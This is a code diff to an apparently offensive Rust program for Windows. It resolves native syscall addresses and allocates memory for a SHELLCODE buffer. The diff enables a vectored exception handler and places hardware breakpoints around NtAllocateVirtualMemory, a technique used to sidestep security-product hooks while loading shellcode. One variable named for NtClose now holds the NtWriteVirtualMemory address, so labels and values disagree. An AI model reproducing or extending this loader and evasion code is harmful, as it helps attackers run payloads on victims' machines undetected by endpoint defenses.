@@ -19,6 +19,7 @@ use windows_sys::Win32::{
         SystemServices::{
             IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
         },
+        Threading::GetCurrentThread,
     },
 };
 
@@ -431,21 +432,22 @@ fn main() {
             sys_addr
         );
 
-        find_sysaddr("NtClose", &mut sys_addr);
+        find_sysaddr("NtWriteVirtualMemory", &mut sys_addr);
         NT_CLOSE_SYSCALL_ADDR = sys_addr;
         if sys_addr.is_null() {
-            println!("[-] Failed to find NtClose syscall address");
+            println!("[-] Failed to find NtWriteVirtualMemory syscall address");
             return;
         }
         println!("[+] NtClose syscall address: {:?}", sys_addr);
 
-        pause();
+        // pause();
 
         let mut base_address: *mut c_void = null_mut();
         let mut size = SHELLCODE.len();
 
-        // AddVectoredExceptionHandler(1, Some(exception_handler));
+        AddVectoredExceptionHandler(1, Some(exception_handler));
 
+        set_hwbp(GetCurrentThread(), NT_ALLOC_SYSCALL_ADDR, 0);
         let status = NtAllocateVirtualMemory(
             -1isize as *mut c_void,
             &mut base_address,
@@ -454,6 +456,8 @@ fn main() {
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
+
+        rm_hwbp(GetCurrentThread(), 0);
 
         if status != 0 {
             println!("[-] Failed to allocate memory");
